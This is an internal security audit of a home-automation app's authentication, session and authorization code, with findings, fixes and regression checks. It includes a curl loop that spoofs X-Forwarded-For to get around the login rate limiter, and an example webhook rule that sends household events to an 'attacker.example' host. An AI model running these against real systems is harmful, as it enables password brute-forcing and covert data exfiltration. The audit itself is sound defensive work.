# HomeChronicle Auth/Session/AuthZ Audit — 2026-08-30 (HEAD 5f105df)

Scope: authentication, sessions, CSRF, role enforcement, rate limiting, token handling. Read-only; HEAD only (working tree ignored). Prior audit `.planning/SECURITY-AUDIT-2026-06-14.md` accepted items (CSP unsafe-inline, PIN/CSRF in sessionStorage, DNS-rebind residual, etc.) are NOT re-reported. Post-audit scope: `git log 89154e9..HEAD` = Phase 25 fix batch, quick 260614-q0j/sc1/jfv, Phase 26 (member alert rules, migration 0008), v0.3.x email/nginx fixes.

Counts: HIGH 0 · MEDIUM 3 · LOW 4 · Informational 2.

---

## MEDIUM

### M-1 — Auth rate limiter keyed on attacker-controlled leftmost `X-Forwarded-For` → login brute-force limiter bypass in the default nginx topology [VERIFIED]
**Files:** `listener/src/security.js:115-125` (`rateLimitKeyGenerator`), `web/nginx.conf.template:84,100,112` (`proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for`), `docker-compose.yml:43` / `docker-compose.portainer.yml:36` (`TRUST_PROXY: ${TRUST_PROXY:-1}`), `listener/src/auth-router.js:107-115,229` (authLimiter on /login etc.), `listener/test/security.test.js:35` (test codifies the leftmost behaviour).

**Mechanism.** When `trust proxy` is set, `rateLimitKeyGenerator` returns `forwardedFor.split(',')[0]` — the LEFTMOST XFF entry. nginx's `$proxy_add_x_forwarded_for` *appends* `$remote_addr` to whatever XFF the client sent, so the leftmost entry is whatever the attacker supplied. Express's own `req.ip` (with `TRUST_PROXY=1`) correctly walks from the right and would yield the real client, but the generator never uses it when an XFF header is present.

**Exploit.** Against the shipped `docker-compose.yml` (nginx → listener, `TRUST_PROXY=1`): `for i in $(seq 1 100000); do curl -H "X-Forwarded-For: 10.$((i/65536)).$((i/256%256)).$((i%256))" -d '{"email":"admin@x","password":"guess'$i'"}' -H 'content-type: application/json' https://host/api/auth/login; done` — every request lands in a fresh bucket; the 10-per-15-min limiter (T-20-BRUTE) never trips. Same bypass for `/claim-admin`, `/accept-invite`, `/forgot-password` (reset-mail flooding), `/reset-confirm`, and every write limiter that uses this generator. Argon2id cost (~50-100 ms/attempt) is the only remaining brake.

**Reachability note.** Behind Traefik (beta/prod, `TRUST_PROXY=2`) Traefik strips untrusted inbound `X-Forwarded-*` by default, so the leftmost entry there is Traefik's own — the bypass needs Traefik `forwardedHeaders.insecure`/trustedIPs misconfig. The vanilla nginx-only compose (the documented default and Portainer path) is directly exploitable from any client that can reach nginx. Pre-auth surface → Medium.

**Fix.** Make the generator `return req.ip ?? req.socket?.remoteAddress ?? 'unknown'` unconditionally — Express already applies the hop-count/trust-proxy logic to `req.ip`, which is the whole point of `TRUST_PROXY`. Update `security.test.js:35` to assert the rightmost-untrusted (`req.ip`) value, not `split(',')[0]`. Optionally normalise `::ffff:` and pass `validate: { xForwardedForHeader: false }` rather than blanket `validate:false`.

### M-2 — H-2 regression: users-router self-guards compare a pg BIGINT *string* to a Number with `===` → self-disable / self-remove guards are dead code [VERIFIED]
**Files:** `listener/src/users-router.js:245` (`req.hcSession.user_id === targetId`), `:353` (same), `:238,:350` (`const targetId = Number(req.params.id)`), `listener/src/db.js:370-379` (`validateSession` RETURNING `s.user_id`), `listener/migrations/0003_users_sessions.sql:4,14` (`users.id BIGSERIAL`, `sessions.user_id BIGINT`), no `types.setTypeParser` anywhere in `listener/src` (grep confirmed).

**Mechanism.** node-postgres returns `int8`/BIGINT columns as **strings** by default (to avoid precision loss); nothing in the listener installs a type parser. So `req.hcSession.user_id` is `'5'` while `targetId` is `5`; `'5' === 5` is `false`, the guard never fires. The June fix (quick 260614-j12) replaced `userId`→`user_id` but the comparison is still always-false. The unit tests pass because `users-router.test.js:122-123` seed `user_id: 1` as a Number. Note `auth-router.js:596` already does `String(s.id) === String(currentId)` for exactly this reason.

**Impact.** Same as original H-2: an admin can disable or delete their *own* account through the API (the UI hides it, but `PATCH /api/users/<own id> {action:'disable'}` succeeds, revokes all their sessions → self-lockout; the last-admin DB guard at `:269-277`/`:368-376` still prevents a zero-admin state). Self-only, no privilege gain — Medium for visibility as a regression of a "resolved" finding, low real harm.

**Fix.** `if (String(req.hcSession.user_id) === String(targetId))` at both sites (or `Number(req.hcSession.user_id) === targetId`). Add a test that seeds `user_id: '1'` (string) to lock the pg behaviour in. Consider a project-wide `types.setTypeParser(20, Number)` in `db.js` only if you audit every `bigint` comparison first.

### M-3 — Disabling a user does NOT stop their alert rules; admins cannot see or delete another user's rules → post-revocation event exfiltration to a webhook the ex-member controls [VERIFIED]
**Files:** `listener/src/alerts.js:201-207` (rule query: `WHERE enabled = TRUE`, no join on `users.disabled_at`), `listener/src/users-router.js:256-296` (disable: sets `disabled_at`, deletes sessions, touches nothing in `alert_rules`), `listener/src/alerts-router.js:262-285` (GET is owner-scoped: `WHERE user_id = $1`), `:346-421` / `:424-445` (PATCH/DELETE `WHERE id AND user_id` — no admin override), `listener/migrations/0008_alert_rules_owner.sql:8` (`ON DELETE CASCADE` — only *deleting* the user cascades).

**Exploit path.** Member creates `POST /api/alerts/rules {channel:'webhook', scopeType:'all', operator:'not_equals', matchValue:'__never__', targetUrl:'https://attacker.example/hook'}` → every household event (accessory/room/characteristic/old→new value, `alerts.js:58-86`) is POSTed to them. Admin later *disables* the member (the documented USER-05 revocation action). The member's sessions die, but `processAlertsForEvent` keeps selecting and firing the rule indefinitely. The admin's Alerts page lists only the admin's own rules (`:263-273`), and PATCH/DELETE 404 for any rule the admin doesn't own — there is no API path to stop it short of `DELETE /api/users/:id` (cascade) or direct SQL. Same applies to a member's email rules (household events keep mailing a revoked address).

**Fix.** (a) In `alerts.js` join users: `FROM alert_rules r LEFT JOIN users u ON u.id = r.user_id WHERE r.enabled AND (r.user_id IS NULL OR u.disabled_at IS NULL)`. (b) In the disable transaction (`users-router.js:280-287`) also `UPDATE alert_rules SET enabled = FALSE WHERE user_id = $1` (or delete). (c) Give admins visibility: either an admin-only `GET /api/alerts/rules?all=1` + owner-or-admin WHERE clause on PATCH/DELETE, so an admin can retire a member's rule without deleting the account.

---

## LOW

### L-1 — Members can point webhook rules at private LAN targets and read back status codes + up to 300 bytes of non-2xx response bodies (member-grade SSRF probe) [VERIFIED mechanism; likely an accepted product decision]
**Files:** `listener/src/alerts-router.js:37-39,91-96,288-307` (POST allows `channel:'webhook'` for any session; `ALERTS_ALLOW_PRIVATE_TARGETS` defaults `true`), `listener/src/alerts.js:152-158` (`response.text().slice(0,300)` stored as `error`), `listener/src/alerts-router.js:447-491` (member reads `responseCode` + `error` back via GET /deliveries), `web/src/components/Alerts.jsx:231-241` (UI locks only the email recipient for members; webhook radio remains selectable).

Before Phase 26 (June H-1 fix) alert-rule writes were admin-only; Phase 26 deliberately opened them to members with only the *email recipient* locked (D-08/T-26-EMAIL-SPOOF). A member can now make the listener POST a JSON body to `http://10.0.0.x:port/path` on every matching event and observe `responseCode` and the first 300 chars of any non-2xx body. SSRF guards (loopback/link-local/multicast blocked, IP pinning, `redirect:'manual'`) still apply; RFC1918 is allowed by default because LAN webhooks (Home Assistant etc.) are the feature. In an invite-only household this is a trusted-peer capability, so Low — but document it, and if members are not meant to have webhooks, gate `channel:'webhook'` on `role === 'admin'` in `validateCreate`/`validatePatch` (one line each) and hide the radio for members.

### L-2 — AUTH_ENABLED=false (legacy token mode): alert rules become unmanageable — GET returns `[]`, POST/PATCH/DELETE return 401, deliveries empty [VERIFIED — functional regression, not a security hole]
**Files:** `listener/src/index.js:534-547` (legacy branch never sets `req.hcSession`), `listener/src/alerts-router.js:263-264` (`if (!uid) return res.json([])`), `:290-292`, `:348-350`, `:426-428` (401 without session), `:449,460,468` (`WHERE r.user_id = $1` with `undefined` → no rows). Existing rules still *fire* (`alerts.js:201-207` has no user filter; migration 0008 leaves `user_id NULL` for auth-off installs, comment "A1").

Answer to "does AUTH_ENABLED=false keep working?": authentication and every other router do; alert-rule CRUD does not (the UI nav is always visible post-26-04, so a legacy user sees an empty list and gets 401 on create). Fix: when `!AUTH_ENABLED` (inject a flag into `createAlertsRouter`), treat the caller as an ownerless admin — list/patch/delete `WHERE user_id IS NULL` and insert with `user_id = NULL`; or document that alerts require AUTH_ENABLED=true.

### L-3 — `PATCH /api/auth/password` has no rate limiter → a stolen session can be used to brute-force the current password and make itself permanent [VERIFIED]
**Files:** `listener/src/auth-router.js:531-581` (no limiter; `verifyPassword` per attempt), compare `:229` (`authLimiter` on login). A session thief already has the account; the only thing standing between them and *permanent* access (change password → revoke all other sessions) is the current-password check, which is unlimited. Argon2id (~50-100 ms) bounds it to ~1k guesses/min. Fix: apply `authLimiter` (or a per-user limiter) to `/password`, and consider re-verifying at `/sessions/:id` too.

### L-4 — Member PATCH with `channel:'webhook'` + any `targetEmail` key → 400 from the CHECK constraint (lock ordering) [VERIFIED — functional]
**Files:** `listener/src/alerts-router.js:196-198` (validatePatch nulls `targetEmail` when switching to webhook) then `:371-373` (member lock sees `'targetEmail' in parsed.value` and re-sets it to the session email) → `chk_alert_channel_fields` (`migrations/0005:13-17`) rejects → mapped to 400 at `:415-417`. Harmless (fails closed) but the member cannot switch an email rule to webhook if the client sends `targetEmail` in the same body. Fix: only apply the lock when the effective channel is/remains `email` (`effectiveChannel === 'email' || (effectiveChannel === undefined && 'targetEmail' in parsed.value)`).

---

## INFORMATIONAL

- **I-1** `GET /api/auth/invite-status` (`auth-router.js:195-226`) and `GET /user-count` (`:171`) are public and not behind `authLimiter` — unauthenticated DB round-trips with no throttle. Token entropy (256-bit, hashed lookup) makes enumeration infeasible; only a cheap-DoS/observability nit. Put `/invite-status` behind the read limiter.
- **I-2** `GET /api/auth/csrf-token?refresh=1` is a state-changing GET (rotates the session's CSRF token, `:161-162`). With `SameSite=Lax` a cross-site top-level navigation to it carries the cookie and can rotate the victim's token → at worst one 403 that the client auto-recovers from (`web/src/lib/api.js:105-109`). No action needed; noting for completeness.

---

## Phase 26 (member alert rules) — targeted answers

| Question | Answer | Evidence |
|---|---|---|
| Can a member read another user's rules? | **No.** GET list is `WHERE user_id = $1` from the session. | `alerts-router.js:263-273` |
| Can a member PATCH/DELETE another user's rule? | **No** — IDOR-safe `WHERE id=$N AND user_id=$M`, 404 on miss. Also means **admins cannot** manage members' rules (see M-3). | `:394-410`, `:434-439` |
| Can a member set `targetEmail` to someone else? | **No.** POST forces session email for every non-admin when channel is email; PATCH forces it when channel→email OR `targetEmail` in body (T-26-EMAIL-SPOOF covered, incl. the no-channel-field vector). Admins may set any recipient (D-08). | `:305-307`, `:371-373` |
| Can a member set a webhook target? | **Yes**, any target passing SSRF validation, private LAN included by default. Not blocked by role. | L-1 |
| Ownership on deliveries? | **Yes** — `JOIN alert_rules r … WHERE r.user_id = $1` on both count and page queries. | `:455-471` |
| `user_id` ever taken from the body? | **No** — `$12` is `req.hcSession.user_id`; PATCH field map has no `userId`. | `:330`, `:377-389` |
| Service-token callers? | Rejected on all writes (401), GET returns `[]`. | `:290,:348,:426,:264` |
| AUTH_ENABLED=false? | Firing works; CRUD does not (L-2). | L-2 |
| Migration 0008 | Additive, idempotent (`IF NOT EXISTS`), backfills to lowest-id admin, `ON DELETE CASCADE`. | `0008_alert_rules_owner.sql` |

---

## June-2026 fixes — regression check (all still in place unless noted)

- **H-1** `requireAdminSession` present on every destructive route: setup scan/pair/pairing-delete/repair/add-pairing/log-level (`setup-router.js:62,79,200,223,314,438`), matter scan/commission/pair/pairing-delete (`matter-router.js:68,109,157,233`), archive delete-accessory/delete-all (`archive-router.js:127,150`), retention (`retention-router.js:94`), repair (`repair-router.js:25`), alerts-settings (`alerts-settings-router.js:25`). Middleware semantics unchanged (`security.js:108-113`: member→403, admin/no-session→pass). Alerts-router no longer uses it — intentional (Phase 26), replaced by owner scoping. ✅
- **H-2** `req.hcSession.user_id` used at `users-router.js:149,211,245,353` ✅ — but the guard comparison is type-broken (M-2). ⚠️
- **M-1** `TRUST_PROXY` defaulted to `1` in `docker-compose.yml:43` and `docker-compose.portainer.yml:36`; `2` in beta. ✅ (but see M-1 above — the key generator undermines it)
- **M-2** accept-invite wrapped in BEGIN/COMMIT with ROLLBACK on redeem-miss and on throw; `issueSession` after COMMIT (`auth-router.js:358-378`). ✅
- **M-3** disabled user → 401 after full verify (`auth-router.js:251-253`); `validateSession` also filters `u.disabled_at IS NULL` (`db.js:375`). ✅
- **M-6** `clearCookie` passes `secure: SESSION_COOKIE_SECURE` (`auth-router.js:520`). ✅
- **M-8** production CORS-localhost warning present — twice (`index.js:99-101` and `:159-161`); harmless duplicate. ✅
- **L-1** `targetUrl` redacted on GET/POST/PATCH rules and deliveries (`alerts-router.js:277,334,412,485`). ✅
- **L-9** `validatePasswordStrength` min 12 (`security.js:242`); claim-admin min 12 (`auth-router.js:283`). ✅
- **L-12** `quietHoursExcludedAccessories` capped at 200 (`retention-router.js:38,158`); email length check before regex (`alerts-router.js:25`). ✅
- **SEC-07 / Phase 23 CR-01** nginx `X-API-Token` injection gated: `web/docker-entrypoint.d/15-compute-api-token.envsh` (sourced `.envsh`, exports `NGINX_API_TOKEN=''` unless `AUTH_ENABLED` ∈ {0,false,no,off}), `web/Dockerfile` copies it + `ENV AUTH_ENABLED=true` fail-safe, template injects `${NGINX_API_TOKEN}` on all three proxy blocks (`nginx.conf.template:81,97,109`). Standalone `docker/standalone/entrypoint.sh:55-66` mirrors it. Empty header → `secureTokenEquals('' …)` false (`security.js:130`). ✅
- **Post-audit nginx change** (f8295c5): per-request `resolver` + variable `proxy_pass` — no auth impact; header injection preserved on all blocks. ✅

## VERIFIED-CLEAN (controls confirmed in source this pass)

- Auth gate order: session cookie first, then service token, public paths exact-matched via `req.path` Set (`index.js:523-581`); `OPTIONS` passthrough; 401 + `WWW-Authenticate`.
- Session tokens: 256-bit `randomBytes`, SHA-256 at rest, single atomic `UPDATE … RETURNING` validate (expiry + user exists + not disabled), `httpOnly; SameSite=Lax; path=/` cookie; anti-fixation revoke-before-issue on login (`auth-router.js:256-258`).
- CSRF: csrf-sync bound to session state, header-only token, skipped only when no session (bearer-token callers), 403 mapped in the global handler; login-CSRF infeasible (JSON-only body parsing, no form parser).
- Login timing equalisation via precomputed dummy argon2 hash (`auth-router.js:64,244-245`); forgot-password constant-shape response + jittered delay; reset/invite tokens single-use via conditional UPDATE; reset revokes all sessions.
- claim-admin bootstrap serialised by `pg_advisory_xact_lock`; last-admin guards under a second advisory lock for disable/demote/remove; disable deletes sessions in the same transaction.
- Sessions API self-scoped (`listSessionsForUser`, `revokeSessionById WHERE id AND user_id`); no token/csrf columns returned.
- `/api/me/preferences` and `/api/users/*` reject service-token callers (401) and `/api/users/*` + `/api/setup/smtp*` enforce admin (403); SMTP password never returned.
- Parameterised SQL throughout the new Phase 26 code (dynamic SET list is built from a fixed column map, values bound).
- Email HTML: alert subject/body pass through `escapeHtml` (`emails.js:32,59,253`).
- Web: `VITE_API_TOKEN` only embedded in DEV builds (`api.js:3-5`); production bundle carries no token; CSRF retry bounded to one attempt.
